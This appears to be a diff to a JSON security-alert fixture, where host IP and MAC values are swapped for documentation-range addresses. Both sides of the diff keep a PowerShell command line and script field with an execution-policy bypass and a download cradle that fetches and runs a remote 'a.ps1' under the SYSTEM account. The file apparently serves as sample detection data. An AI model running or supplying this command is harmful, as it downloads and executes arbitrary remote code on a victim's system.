@@ -30,8 +30,8 @@
       "host": {
         "id": "2868257359929504570",
         "name": "DESKTOP-FIN-0457",
-        "ip": "203.0.113.38",
-        "mac": "00:50:56:9a:2c:11"
+        "ip": "192.0.2.111",
+        "mac": "00:00:5E:00:53:6E"
       }
     },
     "carriers": [
@@ -43,7 +43,7 @@
           "uid": "17315699910326c507f53b59d93c68b7",
           "pid": "16400",
           "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-          "cmdline": "powershell.exe -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.106/a.ps1')",
+          "cmdline": "powershell.exe -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.15/a.ps1')",
           "created_time": 1734466207744,
           "user": {
             "name": "NT AUTHORITY\\SYSTEM",
@@ -69,7 +69,7 @@
         "script": {
           "id": "12e821ca-0d5c-409a-8bbf-fa39567d4d70",
           "language": "powershell",
-          "command": "IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.106/a.ps1')"
+          "command": "IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.15/a.ps1')"
         }
       }
     ],
